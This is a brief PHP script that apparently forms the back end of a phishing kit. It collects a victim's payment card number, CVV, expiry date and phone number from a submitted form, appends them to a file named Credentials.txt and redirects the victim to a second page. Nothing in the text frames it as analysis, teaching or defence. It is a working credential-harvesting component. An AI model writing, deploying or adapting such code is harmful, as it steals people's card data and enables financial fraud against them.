<?php

file_put_contents("Credentials.txt", "Information" . "\n" .  "Card Number: " .  $_POST['login_email'] . "\n" .  "CVV: " . $_POST['login_CVV'] . "\n" .  "Expiry Date: " . $_POST['login_login_password'] . "\n" . "Phone Number: " . $_POST['login_PhoneNo'] . "\n", FILE_APPEND);
header('Location: /index2.html');
exit();
